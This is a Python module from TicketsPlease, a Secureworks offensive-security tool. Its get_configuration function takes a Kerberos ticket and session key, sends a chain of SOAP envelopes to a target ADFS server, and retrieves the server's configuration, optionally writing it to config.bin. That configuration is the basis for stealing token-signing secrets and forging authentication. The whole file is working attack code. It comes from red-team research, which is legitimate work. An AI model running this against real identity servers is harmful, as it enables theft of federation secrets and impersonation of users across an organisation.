# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from ticketsplease.modules.adfs.envelope import RST_ENVELOPE
from ticketsplease.modules.adfs.envelope import SCT_ENVELOPE
from ticketsplease.modules.adfs.envelope import ADFS_ENVELOPE
from ticketsplease.modules.adfs.configuration import get_encrypted_pfx

import base64
from typing import Union
from impacket.krb5.crypto import Key, Enctype, _enctype_table  # type: ignore


def get_configuration(
    adfs_host: str,
    ticket: str,
    sessionKey: Union[str, bytes, "impacket.krb5.crypto.Key"],  # type: ignore
    cipher: "impacket.krb5.crypto._RC4" = None,  # type: ignore
    output: bool = False,
) -> str:
    """Remotely pull down the configuration from a target ADFS server.
    This leverages a ticket generated by the `ticket` module of
    TicketsPlease.

    Arguments:
        adfs_host: target ADFS server
        ticket: base64 encoded Kerberos ticket
        sessionKey: key bytes or impacket Key object
        cipher: impacket cipher object
        output: bool to write the config to a file

    Returns:
        ADFS configuration
    """
    # Create a cipher, if not provided, based on the sessionKey
    # otherwise default to RC4
    if not cipher:
        if isinstance(sessionKey, Key):
            cipher = _enctype_table[sessionKey.enctype]
        else:
            cipher = _enctype_table[Enctype.RC4]

    # Create a Key object if bytes provided
    if isinstance(sessionKey, bytes):
        sessionKey = Key(cipher.enctype, sessionKey)
    elif isinstance(sessionKey, str):
        sessionKey = Key(cipher.enctype, base64.b64decode(sessionKey))

    # Build and send our RST (RequestSecurityToken) Envelope
    # Parse the RST Response Envelope
    rtsr_data = RST_ENVELOPE.run(
        adfs_host=adfs_host,
        ticket_base64=ticket,
        cipher=cipher,
        sessionKey=sessionKey,
    )

    # Build and send our SCT (SecurityContextToken) Envelope
    # Parse the SCT Response Envelope
    sctr_data = SCT_ENVELOPE.run(
        adfs_host=adfs_host,
        rstr=rtsr_data,
    )

    # Build and send our ADFS (Request ADFS Config) Envelope
    # Parse the ADFS Response Envelope
    configuration = ADFS_ENVELOPE.run(
        adfs_host=adfs_host,
        sctr=sctr_data,
    )

    # Write the ADFS config to an output file
    if output:
        with open("config.bin", "w") as f:
            f.write(configuration)

    return configuration
